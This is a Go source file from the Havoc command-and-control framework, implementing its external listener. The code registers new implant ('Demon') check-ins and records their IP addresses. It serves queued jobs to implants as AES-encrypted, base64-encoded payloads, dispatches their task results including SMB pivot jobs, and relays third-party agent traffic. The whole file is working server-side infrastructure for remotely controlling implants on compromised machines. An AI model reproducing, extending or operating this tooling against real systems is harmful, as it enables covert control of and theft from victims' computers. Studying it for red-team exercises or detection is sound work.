package handlers

import (
    "Havoc/pkg/agent"
    "Havoc/pkg/colors"
    "Havoc/pkg/common/packer"
    "Havoc/pkg/common/parser"
    "Havoc/pkg/logger"
    "encoding/base64"
    "encoding/hex"
    "fmt"
    "io/ioutil"
    "strings"

    "github.com/gin-gonic/gin"
)

func NewExternal(WebSocketEngine any, Config ExternalConfig) *External {
    var external = new(External)

    external.engine = WebSocketEngine.(*gin.Engine)
    external.Config = Config

    return external
}

func (e *External) Start() {
    logger.Info("Started \"" + colors.Green(e.Config.Name) + "\" listener: " + colors.BlueUnderline("external://"+e.Config.Endpoint))

    pk := e.RoutineFunc.AppendListener("", LISTENER_EXTERNAL, e)
    e.RoutineFunc.EventAppend(pk)
    e.RoutineFunc.EventBroadcast("", pk)
}

func (e *External) Request(ctx *gin.Context) {
    logger.Debug("ExternalC2 [" + e.Config.Name + "] client connected")

    var (
        AgentInstance *agent.Agent
        RequestParser *parser.Parser
    )

    Body, err := ioutil.ReadAll(ctx.Request.Body)
    if err != nil {
        logger.Debug("Error while reading request: " + err.Error())
    }

    logger.Debug("Body: \n" + hex.Dump(Body))

    RequestParser = parser.NewParser(Body)

    for RequestParser.Length() != 0 {
        var AgentHeader = agent.AgentHeader{}

        AgentHeader.Data = parser.NewParser(RequestParser.ParseBytes())

        AgentHeader.Size = AgentHeader.Data.Length()
        AgentHeader.MagicValue = AgentHeader.Data.ParseInt32()
        AgentHeader.AgentID = AgentHeader.Data.ParseInt32()

        logger.Debug(fmt.Sprintf("Header Size       : %d", AgentHeader.Size))
        logger.Debug(fmt.Sprintf("Header MagicValue : %x", AgentHeader.MagicValue))
        logger.Debug(fmt.Sprintf("Header AgentID    : %x", AgentHeader.AgentID))
        logger.Debug(fmt.Sprintf("Header Data       : \n%v", hex.Dump(AgentHeader.Data.Buffer())))
        logger.Debug(fmt.Sprintf("Rest Data         : \n%v", hex.Dump(RequestParser.Buffer())))

        if AgentHeader.Data.Length() > 4 {

            if AgentHeader.MagicValue == agent.DEMON_MAGIC_VALUE {

                if e.RoutineFunc.AgentExists(AgentHeader.AgentID) {
                    logger.Debug("Agent does exists. continue...")
                    var Command int

                    // get our agent instance based on the agent id
                    AgentInstance = e.RoutineFunc.AgentGetInstance(AgentHeader.AgentID)
                    Command = AgentHeader.Data.ParseInt32()

                    logger.Debug(fmt.Sprintf("Command: %d (%x)", Command, Command))

                    if Command == agent.COMMAND_GET_JOB {

                        AgentInstance.UpdateLastCallback(e.RoutineFunc)

                        if len(AgentInstance.JobQueue) > 0 {
                            var (
                                JobQueue = AgentInstance.GetQueuedJobs()
                                Payload  = agent.BuildPayloadMessage(JobQueue, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
                                Packer   = packer.NewPacker(nil, nil)
                            )

                            Packer.AddInt32(int32(AgentHeader.AgentID))
                            Packer.AddBytes(Payload)
                            Payload = Packer.Buffer()

                            BytesWritten, err := ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(Payload)))
                            if err != nil {
                                logger.Error("Couldn't write to HTTP connection: " + err.Error())
                            } else {
                                var ShowBytes = true

                                for j := range JobQueue {
                                    if JobQueue[j].Command == agent.COMMAND_PIVOT {
                                        if len(JobQueue[j].Data) > 1 {
                                            if JobQueue[j].Data[0] == agent.DEMON_PIVOT_SMB_COMMAND {
                                                ShowBytes = false
                                            }
                                        }
                                    } else {
                                        ShowBytes = true
                                    }
                                }

                                if ShowBytes {
                                    e.RoutineFunc.CallbackSize(AgentInstance, BytesWritten)
                                }
                            }
                        } else {
                            var (
                                Packer = packer.NewPacker(nil, nil)
                                NoJob  = []agent.Job{{
                                    Command: agent.COMMAND_NOJOB,
                                    Data:    []interface{}{},
                                }}

                                Payload = agent.BuildPayloadMessage(NoJob, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
                            )

                            Packer.AddInt32(int32(AgentHeader.AgentID))
                            Packer.AddBytes(Payload)
                            Payload = Packer.Buffer()

                            _, err := ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(Payload)))
                            if err != nil {
                                logger.Error("Couldn't write to HTTP connection: " + err.Error())
                                return
                            }
                        }
                    } else {
                        AgentInstance.TaskDispatch(Command, AgentHeader.Data, e.RoutineFunc)
                    }

                } else {
                    logger.Debug("Agent does not exists. hope this is a register request")
                    var Command = AgentHeader.Data.ParseInt32()

                    if Command == agent.DEMON_INIT {

                        logger.Debug("Is register request. continue...")

                        AgentInstance = agent.ParseResponse(AgentHeader.AgentID, AgentHeader.Data)
                        if AgentInstance == nil {
                            logger.Debug("Exit")
                            ctx.AbortWithStatus(404)
                            return
                        }

                        go AgentInstance.BackgroundUpdateLastCallbackUI(e.RoutineFunc)

                        AgentInstance.Info.ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
                        AgentInstance.Info.MagicValue = AgentHeader.MagicValue
                        AgentInstance.Info.Listener = e

                        e.RoutineFunc.AppendDemon(AgentInstance)

                        pk := e.RoutineFunc.EventNewDemon(AgentInstance)
                        e.RoutineFunc.EventAppend(pk)
                        e.RoutineFunc.EventBroadcast("", pk)

                        /*Packer = packer.NewPacker(AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
                          Packer.AddUInt32(uint32(AgentHeader.AgentID))

                          Response = Packer.Build()

                          logger.Debug(fmt.Sprintf("%x", Response))*/

                        _, err = ctx.Writer.Write([]byte{})
                        if err != nil {
                            logger.Error(err)
                            return
                        }

                        logger.Debug("Finished request")
                    } else {
                        logger.Debug("Is not register request. bye...")
                    }
                }
            } else {
                // TODO: handle 3rd party agent.
                logger.Debug("Is 3rd party agent. I hope...")

                if e.RoutineFunc.ServiceAgentExits(AgentHeader.MagicValue) {
                    var AgentData any = nil

                    AgentInstance = e.RoutineFunc.AgentGetInstance(AgentHeader.AgentID)
                    if AgentInstance != nil {
                        AgentData = AgentInstance.ToMap()
                    }

                    // receive message
                    Response := e.RoutineFunc.ServiceAgentGet(AgentHeader.MagicValue).SendResponse(AgentData, AgentHeader)

                    _, err = ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(Response)))
                    if err != nil {
                        logger.Error(err)
                        return
                    }

                } else {
                    logger.Debug("Alright its not a 3rd party agent request. cya...")
                }
            }
        }
    }

    logger.Debug("Final Exit")
    ctx.AbortWithStatus(404)
    return
}
